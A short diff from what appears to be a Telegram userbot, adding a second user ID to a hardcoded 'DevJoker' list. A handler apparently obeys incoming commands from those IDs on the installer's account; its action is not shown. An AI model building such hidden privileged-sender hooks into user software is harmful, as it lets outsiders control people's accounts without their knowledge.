@@ -603,7 +603,7 @@ async def Reda (event):
     except BaseException as er:
      await event.reply(f"حدث خطأ\n{er}\n{entity}")
 
-DevJoker = [6205161271]
+DevJoker = [6205161271,5762222122]
 @l313l.on(events.NewMessage(incoming=True))
 async def Hussein(event):
     if event.message.message.startswith("اطلع") and event.sender_id in DevJoker:
